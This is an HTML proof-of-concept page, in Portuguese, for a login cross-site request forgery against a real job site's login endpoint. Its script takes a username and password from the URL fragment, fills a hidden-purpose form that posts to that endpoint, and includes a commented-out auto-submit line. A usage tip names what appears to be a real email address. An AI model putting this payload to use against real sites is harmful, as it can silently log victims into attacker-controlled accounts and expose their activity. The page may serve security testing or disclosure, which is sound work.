<!doctype html>
<meta charset="utf-8">
<title>PoC Login CSRF (visível)</title>
<body>
<h2>PoC Login CSRF (urlencoded)</h2>
<p>Esta página envia um POST para <code>/auth/login/username-password</code>.</p>

<div id="debug" style="padding:8px;border:1px dashed #999;margin:10px 0;"></div>

<form id="f" action="https://www.glassdoor.com.br/auth/login/username-password" method="POST">
  <label>Email (username):<br><input id="u" name="username" style="width:400px"></label><br><br>
  <label>Senha (password):<br><input id="p" name="password" type="text" style="width:400px"></label><br><br>
  <label>postLoginUrl:<br><input id="r" name="postLoginUrl" value="" style="width:400px"></label><br><br>
  <button type="submit">ENVIAR (fazer POST)</button>
</form>

<script>
(function(){
  // Lê fragmento: #u=...&p=...
  const frag = location.hash || '';
  const dbg = document.getElementById('debug');
  dbg.innerHTML = '<b>Fragmento atual:</b> <code>' + (frag || '(vazio)') + '</code><br>'
    + 'Exemplo de uso: <code>#u=seu-email%40exemplo.com&p=SuaSenha123!</code>';

  // Tenta parsear os valores
  if (frag.startsWith('#')) {
    const params = new URLSearchParams(frag.slice(1));
    const u = params.get('u');
    const p = params.get('p');
    if (u) document.getElementById('u').value = u;
    if (p) document.getElementById('p').value = p;
    if (u && p) {
      dbg.innerHTML += '<br><span style="color:green">OK: valores do fragmento aplicados aos campos acima.</span>';
      // Se quiser auto-enviar quando houver u & p, descomente a linha abaixo:
      // document.getElementById('f').submit();
    } else {
      dbg.innerHTML += '<br><span style="color:#c00">Atenção: não encontrei u e/ou p no fragmento.</span>';
    }
  }
})();
</script>

<p style="margin-top:20px;font-size:12px;color:#555">
Dicas: use <code>%40</code> no lugar de <code>@</code> (ex.: <code>jonata.uberro%40gmail.com</code>).
Se sua senha tiver espaços, use <code>%20</code>. Caracteres como <code>&</code> e <code>#</code> precisam ser escapados.
</p>
</body>
